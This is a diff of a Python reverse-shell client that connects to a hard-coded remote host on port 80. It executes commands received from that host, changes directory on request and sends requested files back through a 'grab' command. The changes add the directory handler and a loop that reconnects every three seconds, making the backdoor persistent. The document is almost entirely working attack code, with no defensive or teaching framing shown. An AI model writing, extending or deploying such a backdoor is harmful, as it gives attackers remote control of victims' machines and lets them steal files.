@@ -2,6 +2,7 @@ import socket
 import subprocess
 import shlex
 import os
+import time
 
 HOST = "172.16.42.137"
 PORT = 80
@@ -52,39 +53,47 @@ def execute_command(s, cmd):
         print('[-] Connection Lost')
         exit()
 
+def changedir(command, s):
+    command, dirpath = command.split(' ')
+    os.chdir(dirpath)
+    s.send((f'[+] Directory changed to {os.getcwd()}').encode())
+
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
         s.connect((HOST, PORT))
+        while True:
+            cmd = s.recv(4096)
+            cmd = cmd.decode()
+
+            if 'terminate' in cmd:
+                s.close()
+                return
+            elif 'cd' in cmd:
+                changedir(cmd, s)
+            elif 'grab' in cmd:
+                grab, path = cmd.split('*')
+                transfer(s, path)
+            else:
+                execute_command(s, cmd)
+
     except ConnectionRefusedError as e:
         print('[-] Host is down')
         s.close()
-        exit(1)
     except ConnectionAbortedError as e:
         print('[-] Host disconnected')
         s.close()
-        exit(1)
     except Exception as e:
         print('[-] Connection closed')
         s.close()
-        exit(1)
-    
-    while True:
-        cmd = s.recv(4096)
-        cmd = cmd.decode()
-
-        if 'terminate' in cmd:
-            s.close()
-            break
-        elif 'grab' in cmd:
-            grab, path = cmd.split('*')
-            transfer(s, path)
-        else:
-            execute_command(s, cmd)
         
-def main():
-    connect()
+def run():
+    while True:
+        if connect() == 1:
+            break        
+
+        time.sleep(3)
 
 if __name__ == "__main__":
-    main()
+    run()
